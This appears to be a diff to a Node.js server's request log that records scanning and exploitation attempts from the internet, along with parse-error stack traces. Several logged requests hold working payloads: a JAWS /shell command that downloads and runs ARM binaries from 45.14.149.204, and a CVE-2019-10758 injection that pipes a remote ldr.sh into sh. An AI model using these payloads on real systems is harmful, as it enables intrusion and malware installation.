@@ -1105,3 +1105,31 @@ POST /checkValid -  {
 }
 HEAD http://110.242.68.4/ -  {}
 GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET /manager/html -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent curl_cve_2019_10758 http://194.40.243.98/ldr.sh||wget --user-agent wget_cve_2019_10758 -q -O - http://194.40.243.98/ldr.sh)|sh")'
+}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET http://passport.baidu.com/ -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:568:22)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+      at processTicksAndRejections (internal/process/task_queues.js:80:21)
+
+GET / -  {}
+GET /api/ -  {}
+GET / -  {}
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:568:22)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+      at processTicksAndRejections (internal/process/task_queues.js:80:21)
+
+GET / -  {}
